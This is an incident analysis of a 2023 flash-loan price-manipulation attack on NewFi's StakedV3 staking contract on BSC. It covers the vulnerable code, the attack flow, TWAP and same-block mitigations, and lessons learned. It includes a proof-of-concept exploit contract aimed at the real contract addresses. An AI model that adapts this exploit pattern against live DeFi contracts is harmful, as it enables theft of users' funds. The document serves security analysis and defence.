# NewFi Flash Loan Chain Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | NewFi |
| Date | 2023-07-10 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$31,000 USD |
| Attack Type | Flash Loan + Staking Price Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x3a10408fd7a2b2a43bd14a17c0d4568430b93132` |
| Attack Contract | `0x18703a4fd7b3688607abf25424b6ab304def2512` |
| Vulnerable Contract | `0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411` (StakedV3) |
| Fork Block | 30,043,573 |

## 2. Vulnerability Code Analysis

NewFi's `StakedV3` contract used the token ratio within the staking pool directly as the spot price. By acquiring large liquidity via a flash loan and then manipulating the pool ratio through chained swaps, the internal price calculation of `StakedV3` became corrupted, enabling arbitrage.

```solidity
// Vulnerable pattern: price calculation based on real-time pool balances
contract StakedV3 {
    IERC20 public BUSD;
    IERC20 public USDT;

    // Vulnerable: staking value calculated from current balance ratio
    function getStakedValue(address user) public view returns (uint256) {
        uint256 busdBalance = BUSD.balanceOf(address(this));
        uint256 usdtBalance = USDT.balanceOf(address(this));
        // Uses manipulable spot ratio
        uint256 ratio = busdBalance * 1e18 / usdtBalance;
        return userShares[user] * ratio / 1e18;
    }

    // Vulnerable: withdrawal calculation based on manipulated ratio
    function withdraw(uint256 shares) external {
        uint256 value = getStakedValue(msg.sender);
        userShares[msg.sender] -= shares;
        BUSD.transfer(msg.sender, value);
    }
}
```

**Vulnerability**: By borrowing large amounts of BUSD via `Pair1.flash()` and then manipulating the BUSD/USDT ratio in the pool through chained swaps, `StakedV3.getStakedValue()` returns an inflated value, allowing withdrawal of more BUSD than the actual staked amount.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Staking Price Manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x3a10408fd7a2b2a43bd14a17c0d4568430b93132]
  │
  ├─1─▶ Calls Pair1.flash() — first flash loan
  │      [Pair1: BSC liquidity pool]
  │      Borrows large amount of BUSD
  │
  ├─2─▶ Conditional callback execution — chained flash loans
  │      Calls additional flash() internally
  │      Manipulates pool ratio via BUSD/USDT swaps
  │
  ├─3─▶ Manipulates StakedV3 value calculation
  │      [StakedV3: 0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411]
  │      Inflates staking value using manipulated BUSD/USDT ratio
  │
  ├─4─▶ Executes withdrawal based on inflated value
  │      Obtains more BUSD than actual staked amount
  │
  └─5─▶ BUSD.transfer() — repays flash loan + realizes profit
         [BUSD: 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]
         ~$31,000 USD profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IStakedV3 {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function getStakedValue(address user) external view returns (uint256);
    function balanceOf(address user) external view returns (uint256);
}

interface IFlashPair {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract NewFiExploit {
    IStakedV3 stakedV3 = IStakedV3(0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IFlashPair Pair1;

    function testExploit() external {
        // Initiate chained flash loans
        Pair1.flash(address(this), BUSD.balanceOf(address(Pair1)) * 99 / 100, 0, "newfi1");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        if (keccak256(data) == keccak256("newfi1")) {
            // Manipulate pool ratio via swaps
            uint256 busdBalance = BUSD.balanceOf(address(this));
            BUSD.approve(address(stakedV3), busdBalance / 2);
            stakedV3.deposit(busdBalance / 2);

            // Further price manipulation via additional swaps
            // Withdraw at manipulated price
            uint256 shares = stakedV3.balanceOf(address(this));
            stakedV3.withdraw(shares);

            // Repay flash loan
            BUSD.transfer(address(Pair1), busdBalance * 99/100 + fee0);
        }
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Spot-price-based staking value calculation, flash loan manipulation |
| Impact Scope | NewFi StakedV3 staking pool |
| Explorer | [BSCscan](https://bscscan.com/address/0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411) |

## 6. Security Recommendations

```solidity
// Mitigation 1: TWAP-based price calculation
contract StakedV3 {
    uint256 public cumulativePrice;
    uint256 public lastUpdateTime;
    uint256 public twapPrice;

    function updateTWAP() internal {
        uint256 timeElapsed = block.timestamp - lastUpdateTime;
        if (timeElapsed > 0) {
            uint256 currentPrice = getCurrentSpotPrice();
            cumulativePrice += currentPrice * timeElapsed;
            twapPrice = cumulativePrice / (block.timestamp - deployTime);
            lastUpdateTime = block.timestamp;
        }
    }

    function getStakedValue(address user) public view returns (uint256) {
        // Use TWAP instead of spot price
        return userShares[user] * twapPrice / 1e18;
    }
}

// Mitigation 2: Flash loan prevention — disallow deposit and withdrawal in the same block
mapping(address => uint256) public lastDepositBlock;

function withdraw(uint256 shares) external {
    require(block.number > lastDepositBlock[msg.sender], "Cannot withdraw in same block as deposit");
    // ...
}

// Mitigation 3: Price deviation cap
function getStakedValue(address user) public view returns (uint256) {
    uint256 currentRatio = getCurrentRatio();
    // Reject changes greater than 5% from last update
    require(
        currentRatio <= lastValidRatio * 105 / 100 &&
        currentRatio >= lastValidRatio * 95 / 100,
        "Price deviation too high"
    );
    return userShares[user] * currentRatio / 1e18;
}
```

## 7. Lessons Learned

1. **Vulnerability of staking value calculations**: Calculating staking pool value from real-time balance ratios is easily manipulated via flash loans. TWAP or an external oracle must be used instead.
2. **Chained flash loan pattern**: A structure where a single flash loan internally triggers another flash loan amplifies the price manipulation effect by mobilizing even larger capital.
3. **Prohibit same-block deposit and withdrawal**: Staking protocols must fundamentally block flash loan attacks by disallowing deposits and withdrawals within the same block.
4. **BSC staking protocol pattern**: Small-scale staking protocols on BSC frequently misuse Uniswap V2-style spot prices, repeatedly exposing themselves to the same flash loan vulnerability.